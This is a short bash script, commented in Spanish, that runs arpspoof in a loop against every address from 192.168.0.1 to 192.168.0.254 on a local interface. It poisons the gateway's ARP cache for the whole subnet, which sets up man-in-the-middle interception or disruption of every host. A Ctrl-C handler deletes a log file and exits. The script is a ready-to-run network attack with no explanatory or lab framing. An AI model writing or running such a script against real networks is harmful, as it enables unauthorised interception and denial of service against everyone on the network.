#!/bin/bash
#COLORES
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

#SALIDA DEL PROGRAMA
function ctrl_c (){
	rm log
	echo -ne "\r         "
	echo -e "\n ${redColour}[+] Salida \n"
	exit 1
}

trap ctrl_c INT

echo "EJECUTANDO SCRIPT"
sleep 0.5

for host in {1..254};
do
  	arpspoof -i enp0s3 -t 192.168.0.1 192.168.0.$host &
done; wait




exit


